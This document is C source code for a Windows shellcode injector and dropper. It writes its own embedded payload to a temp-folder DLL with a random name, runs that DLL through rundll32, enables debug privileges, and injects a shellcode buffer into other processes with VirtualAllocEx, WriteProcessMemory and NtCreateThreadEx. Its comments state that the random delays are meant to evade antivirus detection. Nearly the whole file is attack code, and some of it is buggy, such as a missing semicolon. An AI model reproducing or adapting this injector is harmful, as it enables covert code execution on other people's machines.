 #define _WIN32_WINNT 0x0501

#include <stdio.h>
#include <windows.h>

#include <time.h>
#include <psapi.h>
#include <stdlib.h>
#include <tlhelp32.h>

typedef struct PROCINFO {
    int id;
    char *name;
    char *path;
    char *owner;
} Process;

const int SELF_LEN = -123456;  // Size of self scode.  Generated by gen.ps1
unsigned char SELF[] = "|/|/"; // Raw scode off self.  Generated by gen.ps1
unsigned char SDATA[] = ""
const int SDATA_LEN = 0;

int iym_debug()
{
    HANDLE wsToken;
    LUID wsTokenValue;
    TOKEN_PRIVILEGES wsTokenP;
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &wsToken)) return 0;
    if(!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &wsTokenValue)) return 0;
    wsTokenP.PrivilegeCount = 1;
    wsTokenP.Privileges[0].Luid = wsTokenValue;
    wsTokenP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if(!AdjustTokenPrivileges(wsToken, FALSE, &wsTokenP, sizeof(wsTokenP), NULL, NULL)) return 0;
    CloseHandle(wsToken);
    return 1;
}
int iym_cmd(char* process)
{
    STARTUPINFO proc_d;
    PROCESS_INFORMATION proc_info;
    memset(&proc_d, 0, sizeof(proc_d));
    proc_d.cb = sizeof(proc_d);
    proc_d.dwFlags = STARTF_USESTDHANDLES;
    if(CreateProcess(NULL, process, NULL, NULL, TRUE, 0x08000000, NULL, NULL, &proc_d, &proc_info) == 0) return 1;
    return 0;
}
int iym_rand(int wsMin, int wsMax)
{
    srand(time(NULL));
    return wsMin + (rand() % (wsMax - wsMin));
}
char* iym_getUser(HANDLE wsProcess)
{
    HANDLE wsTokenHandle;
    OpenProcessToken(wsProcess, TOKEN_READ, &wsTokenHandle);
    if(wsTokenHandle == NULL) return NULL;
    PTOKEN_USER wsUser = NULL;
    DWORD wsSize = 0, wsMAX = 256;
    if(!GetTokenInformation(wsTokenHandle, TokenUser, (LPVOID)wsUser, 0, &wsSize))
    {
        if(GetLastError() != ERROR_INSUFFICIENT_BUFFER) return NULL;
        wsUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, wsSize);
        if(wsUser == NULL) return NULL;
    }
    if(!GetTokenInformation(wsTokenHandle, TokenUser, (LPVOID)wsUser, wsSize, &wsSize))
    {
        HeapFree(GetProcessHeap(), 0, (LPVOID)wsUser);
        return NULL;
    }
    SID_NAME_USE wsSID;
    char wsName[256], wsDomain[256];
    if(!LookupAccountSid(NULL, wsUser->User.Sid, wsName, &wsMAX, wsDomain, &wsMAX, &wsSID))
    {
        if(GetLastError() == ERROR_NONE_MAPPED) return "NONE_MAPPED";
        return NULL;
    }
    char* wsUsername = calloc(1, 2 + strlen(wsName) + strlen(wsDomain));
    strncat(wsUsername, wsDomain, strlen(wsDomain));
    strncat(wsUsername, "\\", 1);
    strncat(wsUsername, wsName, strlen(wsName));
    strncat(wsUsername, "\0", 1);
    if(wsUser != NULL) HeapFree(GetProcessHeap(), 0, (LPVOID)wsUser);
    return wsUsername;
}
Process* iym_processes(int **wsProcCount)
{
    iym_debug();
    DWORD pList[2048], pRet, pCount;
    if(!EnumProcesses(pList, sizeof(pList), &pRet)) return NULL;
    pCount = pRet/sizeof(DWORD);
    Process *pInfo = malloc(pCount * sizeof(Process));
    HANDLE pHandle;
    HMODULE pModule;
    int pCounter;
    *wsProcCount = (int*)pCount;
    DWORD count;
    for(pCounter = 0; pCounter < pCount; pCounter++)
    {
        pInfo[pCounter].id = pList[pCounter];
        pInfo[pCounter].name = calloc(256, 1);
        pInfo[pCounter].path = calloc(256, 1);
        pHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pList[pCounter]);
        if(pHandle != NULL)
        {
            pInfo[pCounter].owner = iym_getUser(pHandle);
            if(EnumProcessModules(pHandle, &pModule, sizeof(pModule), &count))
            {
                GetModuleBaseName(pHandle, pModule, pInfo[pCounter].name, 256);
                GetProcessImageFileName(pHandle, pInfo[pCounter].path, 256);
            }
            else
            {
                strcat(pInfo[pCounter].name, "\0");
                strcat(pInfo[pCounter].path, "\0");
            }
            if(pInfo[pCounter].owner == NULL)
            {
                pInfo[pCounter].owner = calloc(1, 1);
                strcat(pInfo[pCounter].owner, "\0");
            }
        }
        else
        {
            pInfo[pCounter].owner = calloc(1, 1);
            strcat(pInfo[pCounter].name, "\0");
            strcat(pInfo[pCounter].path, "\0");
            strcat(pInfo[pCounter].owner, "\0");
        }
    }
    return pInfo;
}
HANDLE iym_ntex(HANDLE pHandle, LPVOID pAddress, LPVOID pSpace)
{
    typedef DWORD (WINAPI * functypeNtCreateThreadEx)
    (
            PHANDLE ThreadHandle,
            ACCESS_MASK DesiredAccess,
            LPVOID ObjectAttributes,
            HANDLE ProcessHandle,
            LPTHREAD_START_ROUTINE lpStartAddress,
            LPVOID lpParameter,
            BOOL CreateSuspended,
            DWORD dwStackSize,
            DWORD Unknown1,
            DWORD Unknown2,
            LPVOID Unknown3
    );
    HANDLE pThread = NULL;
    HMODULE pNtModule = GetModuleHandle("ntdll.dll");
    if(pNtModule == NULL)
        return NULL;
    functypeNtCreateThreadEx pFuncNTEx = (functypeNtCreateThreadEx)GetProcAddress(pNtModule, "NtCreateThreadEx");
    if(!pFuncNTEx)
        return NULL;
    pFuncNTEx(&pThread, GENERIC_ALL, NULL, pHandle, (LPTHREAD_START_ROUTINE)pAddress, pSpace, FALSE, (DWORD)NULL, (DWORD)NULL, (DWORD)NULL, NULL);
    return pThread;
}
int iym_runDLL(char* wsDllPath, char* wsDllEntry, char* wsArguments)
{
    int wsArgSize = 10 + strlen(wsDllPath) + strlen(wsDllEntry);
    if(wsArguments != NULL) wsArgSize += (1 + strlen(wsArguments));
    char *wsDllCommand = calloc(wsArgSize, 1);
    sprintf(wsDllCommand, "rundll32 %s,%s", wsDllPath, wsDllEntry);
    if(wsArguments != NULL)
    {
        strncat(wsDllCommand, " ", 1);
        strncat(wsDllCommand, wsArguments, strlen(wsArguments));
    }
    int wsRet = iym_cmd(wsDllCommand);
    free(wsDllCommand);
    return wsRet;
}
char* iym_randomString(int wsLength, char* wsPrefix, char* wsPostfix)
{
    srand(time(NULL));
    int wsLen = wsLength, wsStart = 0, wsTempA;
    if(wsPrefix != NULL)
    {
        wsStart = strlen(wsPrefix);
        wsLen += wsStart;
    }
    if(wsPostfix != NULL) wsLen += strlen(wsPostfix);
    char* wsRand = calloc(wsLen, 1);
    if(wsPrefix != NULL) strncat(wsRand, wsPrefix, wsStart);
    for(wsTempA = 0; wsTempA < wsLength; wsTempA++)
    {
        if(rand() % 2 == 1) wsRand[wsStart + wsTempA] = (char)(65 + (rand() % 26));
        else wsRand[wsStart + wsTempA] = (char)(97 + (rand() % 26));
    }
    strncat(wsRand, wsPostfix, strlen(wsPostfix));
    return wsRand;
}
int iym_injectCode(int wsInjectPID, int wsDataSize, unsigned char* wsSCode)
{
    HANDLE inProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, wsInjectPID);
    if(inProcess == NULL) return 0;
    int wsDataLen = wsDataSize;
    if(wsDataLen <= 0) wsDataLen = strlen(wsSCode);
    LPVOID inMemory = (LPVOID)VirtualAllocEx(inProcess, NULL, wsDataLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(inMemory == NULL) return 0;
    DWORD inCounter;
    if(WriteProcessMemory(inProcess, inMemory, wsSCode, wsDataLen, &inCounter) == 0) return 0;
    HANDLE inHandle = iym_ntex(inProcess, inMemory, NULL);
    if(inHandle == NULL) return 0;
    CloseHandle(inProcess);
    return 1;
}
char* iym_createDLL(char* wsDllName, char* wsDllDir, int wsDataSize, unsigned char* wsDllData)
{
    char* wsTempFullPath;
    if(wsDllDir == NULL)
    {
        char* wsTempPath = calloc(256, 1);
        if(GetTempPath(256, wsTempPath) == 0) return 0;
        wsTempFullPath = calloc(strlen(wsTempPath) + strlen(wsDllName), 1);
        strncat(wsTempFullPath, wsTempPath, strlen(wsTempPath));
        strncat(wsTempFullPath, wsDllName, strlen(wsDllName));
        free(wsTempPath);
    }
    else
    {
        wsTempFullPath = calloc(strlen(wsDllDir) + strlen(wsDllName), 1);
        strncat(wsTempFullPath, wsDllDir, strlen(wsDllDir));
        strncat(wsTempFullPath, wsDllName, strlen(wsDllName));
    }
    FILE *wsDLLTemp = fopen(wsTempFullPath, "wb");
    if(wsDLLTemp == NULL) return 0;
    int wsCount, wsDllSize = wsDataSize;
    if(wsDataSize <= 0) wsDllSize = strlen(wsDllData);
    for(wsCount = 0; wsCount < wsDllSize; wsCount++)
        fprintf(wsDLLTemp, "%c", wsDllData[wsCount]);
    fclose(wsDLLTemp);
    free(wsDLLTemp);
    return wsTempFullPath;
}


int main(int argc, char *argv[])
{
    char *b = iym_randomString(8, NULL, ".dll"), *a = iym_createDLL(b, NULL, SELF_LEN, SELF);
    free(b);
    printf("DLL is at '%s'!\n", a);
    iym_runDLL(a, "runit", a);
    free(a);
    return 0;
}
__declspec(dllexport) void runit(HWND wsHandle, HINSTANCE wsInstance, LPSTR wsArguments, int wsShowCmd)
{
    int *a, b = 0;
    Process *c = iym_processes(&a);
    for(b = 0; b < (int)a; b++)
    {
        if(strlen(c[b].name) > 0 && c[b].id > 600)
        {
            Sleep(iym_rand(3000, 8000)); // add random pause to evade AV detection from direct access
            if(iym_injectCode(c[b].id, SDATA_LEN, SDATA)) break;
        }
    }
}
